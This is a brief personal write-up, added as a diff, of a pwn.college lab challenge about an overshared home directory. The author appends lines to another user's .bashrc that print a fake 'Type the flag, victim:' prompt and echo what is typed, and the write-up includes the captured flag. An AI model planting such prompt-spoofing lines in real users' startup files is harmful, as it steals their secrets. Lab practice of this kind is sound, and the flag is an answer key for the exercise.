@@ -1,0 +1,23 @@
+# challenge: overshared directories
+
+📅 2025-06-19
+📁 silly shenanigas
+
+---
+
+## ✅ what i did  
+-clicked start
+-opened the terminal
+-ran: 'vim /home/zardus/.bashrc'
+-added at the end:  'read garbage'
+                    'echo -n "Type the flag, victim: "'
+                    'read -r candidate'
+                    'echo $candidate'
+-ran: '/challenge/victim'
+-flag popped out
+
+## 🧑🏾‍🏫 what this challenge teaches u
+just used the same procedure as the challenge before, 1° WAY
+
+## 🏁 Flag  
+pwn.college{oed9QhDZu09UTT7ZAYuqGdkvb--.0FM0EzNxwCO4IDOxEzW}
